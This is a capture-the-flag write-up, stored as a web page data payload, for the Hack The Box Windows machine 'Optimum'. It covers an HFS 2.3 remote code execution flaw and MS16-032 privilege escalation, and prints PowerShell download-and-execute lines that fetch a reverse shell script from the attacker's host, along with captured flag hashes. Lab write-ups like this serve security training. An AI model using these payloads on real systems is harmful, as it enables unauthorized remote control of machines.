__NUXT_JSONP__("/writeups/optimum-htb", (function(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D){return {data:[{article:{slug:"optimum-htb",description:"HTB Easy Machine",title:"Optimum",img:"\u002Fimages\u002Fwriteups\u002Foptimum\u002Foptimum.png",tags:["easy","windows","msfvenom","smb","nmap","cve-exploit "],toc:[{id:u,depth:r,text:v},{id:w,depth:r,text:x},{id:y,depth:r,text:z},{id:A,depth:r,text:B}],body:{type:"root",children:[{type:b,tag:"h1",props:{id:"optimum-easy-windows"},children:[{type:b,tag:l,props:{ariaHidden:m,href:"#optimum-easy-windows",tabIndex:n},children:[{type:b,tag:o,props:{className:[p,q]},children:[]}]},{type:a,value:"Optimum #Easy #Windows"}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"#web #hfs #technique-webserver #searchsploit #cve-exploit"}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:b,tag:f,props:{},children:[{type:a,value:"IP"}]},{type:a,value:": 10.10.10.8\n"},{type:b,tag:f,props:{},children:[{type:a,value:"Start date"}]},{type:a,value:": [[2022-04-14]]\n"},{type:b,tag:f,props:{},children:[{type:a,value:"End date"}]},{type:a,value:": [[2022-04-15]]"}]},{type:a,value:c},{type:b,tag:s,props:{id:u},children:[{type:b,tag:l,props:{ariaHidden:m,href:"#10-enumeration---nmap",tabIndex:n},children:[{type:b,tag:o,props:{className:[p,q]},children:[]}]},{type:a,value:v}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"Initial enumeration."}]},{type:a,value:c},{type:b,tag:g,props:{className:[h]},children:[{type:b,tag:i,props:{className:[j,k]},children:[{type:b,tag:d,props:{},children:[{type:a,value:"title: `nmap -SCV -p- -n -Pn --min-rate 5000 -oA nmap\u002Foptimum.tcp 10.10.10.8`\ncollapse: open\n```python\nPORT   STATE SERVICE VERSION\n80\u002Ftcp open  http    HttpFileServer httpd 2.3\n|_http-title: HFS \u002F\n|_http-server-header: HFS 2.3\nService Info: OS: Windows; CPE: cpe:\u002Fo:microsoft:windows\n"}]}]}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"There is only one port open, which is 80 and hosting a http web server running "},{type:b,tag:d,props:{},children:[{type:a,value:"HttpFileServer"}]},{type:a,value:" version "},{type:b,tag:d,props:{},children:[{type:a,value:"httpd 2.3"}]},{type:a,value:t}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"We also run an UDP scanning "},{type:b,tag:d,props:{},children:[{type:a,value:"nmap -sU -n -Pn --min-rate 5000 nmap\u002Foptimum.udp 10.10.10.8"}]},{type:a,value:" but it returns nothing."}]},{type:a,value:c},{type:b,tag:s,props:{id:w},children:[{type:b,tag:l,props:{ariaHidden:m,href:"#11-enumeration---port-80",tabIndex:n},children:[{type:b,tag:o,props:{className:[p,q]},children:[]}]},{type:a,value:x}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"The first I notice is the web server is running "},{type:b,tag:d,props:{},children:[{type:a,value:"HttpFileServer 2.3"}]},{type:a,value:", so I run a "},{type:b,tag:d,props:{},children:[{type:a,value:"searchsploit httpd"}]},{type:a,value:" to check if the version is vulnerable or has a public exploit out in the wild."}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"There is a "},{type:b,tag:f,props:{},children:[{type:a,value:"remote code execution (rce)"}]},{type:a,value:" vulnerability."}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"The exploit abuses the search functionality by using a "},{type:b,tag:d,props:{},children:[{type:a,value:"null character"}]},{type:a,value:"( %00)."}]},{type:a,value:c},{type:b,tag:s,props:{id:y},children:[{type:b,tag:l,props:{ariaHidden:m,href:"#20-exploitation---kostas",tabIndex:n},children:[{type:b,tag:o,props:{className:[p,q]},children:[]}]},{type:a,value:z}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"Exploiting the vulnerability is quite easy and can be done by varios ways, the easiest is to forge a custom GET request to execute a powershell."}]},{type:a,value:c},{type:b,tag:g,props:{className:[h]},children:[{type:b,tag:i,props:{className:[j,k]},children:[{type:b,tag:d,props:{},children:[{type:a,value:"title: Architecture issues\n\nBy running `systeminfo` inside the victim machine we know the system is **x64-based PC**.\n\nIt is important to notice that if we run the standard `powershell` inside our rce.py exploit it will get us a powershell 32-bit process inside a x64 OS !\n\nThis is probabily because the HFS (httpfileserver) process is likely running as a 32-bit process.\n\nTo check the CLI process architecture we can run `[Environment]::Is64BitProcess`. \n\nIn a 64-bit Windows to get the 64-bit version of powershell we can run powershell directly from its directory `C:\\Windows\\sysNative\\WindowsPowerShell\\v1.0\\powershell.exe` this will return a 64-bit powershell process.\n\nMore information about process architecture at [[Powershell Shell Version]]\n"}]}]}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"The exploit returns a stable shell as user "},{type:b,tag:d,props:{},children:[{type:a,value:"kostas"}]},{type:a,value:".\n![[httpfileserver_vuln_rce.png]]"}]},{type:a,value:c},{type:b,tag:s,props:{id:A},children:[{type:b,tag:l,props:{ariaHidden:m,href:"#30-privilege-escalation-kostas----nt-authority",tabIndex:n},children:[{type:b,tag:o,props:{className:[p,q]},children:[]}]},{type:a,value:B}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"We run an initial check on the system by running "},{type:b,tag:d,props:{},children:[{type:a,value:"systeminfo"}]},{type:a,value:" and sending it to our machine and running "},{type:b,tag:d,props:{},children:[{type:a,value:"windows-exploit-suggester"}]},{type:a,value:t}]},{type:a,value:c},{type:b,tag:g,props:{className:[h]},children:[{type:b,tag:i,props:{className:[j,k]},children:[{type:b,tag:d,props:{},children:[{type:a,value:"title: `python2.7 windows-exploit-suggester --database db.xls --systeminfo sysinfo`\n\nIt returns a lot of possible exploits that are vulnerable, let's try one that allows us to escalate privileges.\n\n(..)\n```python\n[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important                      \n[*]   https:\u002F\u002Fwww.exploit-db.com\u002Fexploits\u002F40085\u002F -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF\n[*]   https:\u002F\u002Fwww.exploit-db.com\u002Fexploits\u002F39788\u002F -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC\n[*]   https:\u002F\u002Fwww.exploit-db.com\u002Fexploits\u002F39432\u002F -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC\n\n"}]}]}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"(..)"}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:a,value:"We can get a "},{type:b,tag:d,props:{},children:[{type:a,value:".ps1"}]},{type:a,value:" version of the exploit by running "},{type:b,tag:d,props:{},children:[{type:a,value:"searchsploit ms16-032"}]},{type:a,value:t}]},{type:a,value:c},{type:b,tag:g,props:{className:[h]},children:[{type:b,tag:i,props:{className:[j,k]},children:[{type:b,tag:d,props:{},children:[{type:a,value:"```ad-note\ntitle: Automatic ``.ps1` function execution.\n\nWhen treating a `.ps1` function we want to run, there is a simple trick to run it without importing it as a module in powershell. This is by adding the function we previously declared at the end of the file.\n\nIn our case we declare the function `function Invoke-MS16-032 {..}`, so we add an extra line at the end of the line `Invoke-MS16-032`. \n"}]}]}]},{type:a,value:c},{type:b,tag:g,props:{className:[h]},children:[{type:b,tag:i,props:{className:[j,k]},children:[{type:b,tag:d,props:{},children:[{type:a,value:"title: New GUI shell using searchsploit `.ps1` exploit. \n\nRunning the previous exploit tells us an new shell has been opened but nothing spawns. This is probably (confirmed) that a new shell is literally being spawned, ie another GUI process. If we run it multiple times we will see that multiple `cmd` processs have been initialized. \n\nEmpire did a re-edit of the exploit to allow command execution. \nThe exploit can be found here [Invoke-MS16-032](https:\u002F\u002Fgithub.com\u002FEmpireProject\u002FEmpire\u002Fblob\u002Fmaster\u002Fdata\u002Fmodule_source\u002Fprivesc\u002FInvoke-MS16032.ps1)\n\nNext step is now to use the switch `-command` to send a reverse shell inside the administrator shell.\n"}]}]}]},{type:a,value:c},{type:b,tag:g,props:{className:[h]},children:[{type:b,tag:i,props:{className:[j,k]},children:[{type:b,tag:d,props:{},children:[{type:a,value:"title: `IEX(New-Object Net.WebClient).downloadString(\"http:\u002F\u002F10.10.14.2:8000\u002FInvoke-MS16-032.ps1\")`\n\nFirst of all, we modify the last line we added to the`.ps1` to invoke us a reverse shell.  \n\nIn this case we will host a python web server with a rev.ps1 (from nishang) which will be listening on port `443`\n\n`Invoke-MS16032 -Command IEX(New-Object Net.WebClient).downloadString(\"http:\u002F\u002F10.10.14.2:8000\u002Frev.ps1\")`\n\n\nOn running we get the shell as `nt authority \u002F system`. Voila! We are root!.\n\n![[root.png]]\n\n"}]}]}]},{type:a,value:c},{type:b,tag:e,props:{},children:[{type:b,tag:f,props:{},children:[{type:a,value:"Flags"}]}]},{type:a,value:c},{type:b,tag:"ul",props:{},children:[{type:a,value:c},{type:b,tag:C,props:{},children:[{type:b,tag:f,props:{},children:[{type:a,value:"User"}]},{type:a,value:": d0c39409d7b994a9a1389ebf38ef5f73"}]},{type:a,value:c},{type:b,tag:C,props:{},children:[{type:b,tag:f,props:{},children:[{type:a,value:"Root"}]},{type:a,value:": 51ed1b36553c8461f4552c2e92b3eeed"}]},{type:a,value:c}]}]},dir:"\u002Fwriteups",path:"\u002Fwriteups\u002Foptimum-htb",extension:".md",createdAt:D,updatedAt:D}}],fetch:{},mutations:void 0}}("text","element","\n","code","p","strong","div","nuxt-content-highlight","pre","language-text","line-numbers","a","true",-1,"span","icon","icon-link",3,"h3",".","10-enumeration---nmap","1.0 Enumeration - Nmap","11-enumeration---port-80","1.1 Enumeration - Port 80","20-exploitation---kostas","2.0 Exploitation -\u003E kostas","30-privilege-escalation-kostas----nt-authority","3.0 Privilege escalation: kostas --\u003E nt authority","li","2022-07-08T13:15:28.303Z")));